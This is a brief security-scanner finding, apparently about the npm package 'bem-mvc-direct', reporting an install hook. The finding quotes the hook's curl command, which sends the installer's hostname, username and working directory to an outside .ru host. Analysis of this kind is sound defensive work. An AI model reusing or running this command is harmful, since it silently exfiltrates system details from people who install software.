behaviors.summary: The package contains an install hook present at install time that executes commands listed in the package metadata.
behaviors.details: The install hook is present in the package and is executed at install time. The commands listed in the package metadata are curl -H"Package: bem-mvc-direct" -H"Version: 1.11.3" -H"Hostname: $(hostname|base64)" -H"Whoami: $(whoami|base64)" -H"Pwd: $(pwd|base64)" -d"meow!securitytest" http://npm_new.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru
